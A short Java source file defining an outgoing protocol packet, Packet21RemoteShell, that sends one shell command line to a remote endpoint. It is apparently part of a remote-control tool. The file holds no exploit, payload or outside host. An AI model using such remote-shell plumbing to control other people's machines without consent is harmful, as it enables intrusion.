package com.redpois0n.packets.outgoing;

import java.io.DataOutputStream;

import com.redpois0n.common.io.StringWriter;

public class Packet21RemoteShell extends AbstractOutgoingPacket {
	
	private String line;
	
	public Packet21RemoteShell(String line) {
		this.line = line;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(this.line);
	}

	@Override
	public byte getPacketId() {
		return 21;
	}

}
